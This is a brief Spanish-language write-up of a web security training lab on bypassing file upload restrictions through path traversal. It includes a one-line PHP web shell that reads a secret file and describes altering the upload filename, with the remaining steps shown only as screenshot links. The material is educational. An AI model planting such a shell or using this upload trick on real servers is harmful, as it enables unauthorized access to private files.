# File upload vulnerabilities

# **Lab: Web shell upload via path traversal**

Creamos un archivo en .php que contenga un exploit de lectura y lo subimos. 

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Intentamos modificar el parámetro filename al momento de subir el archivo.

![image.png](File%20upload%20vulnerabilities%208f3ddce2bbee4506bb5bc326e86a745e/image.png)

![image.png](File%20upload%20vulnerabilities%208f3ddce2bbee4506bb5bc326e86a745e/image%201.png)

Accedemos a la web del usuario y vemos que se carga la “foto” que hemos subido.

![image.png](File%20upload%20vulnerabilities%208f3ddce2bbee4506bb5bc326e86a745e/image%202.png)

![image.png](File%20upload%20vulnerabilities%208f3ddce2bbee4506bb5bc326e86a745e/image%203.png)

![image.png](File%20upload%20vulnerabilities%208f3ddce2bbee4506bb5bc326e86a745e/image%204.png)

![image.png](File%20upload%20vulnerabilities%208f3ddce2bbee4506bb5bc326e86a745e/image%205.png)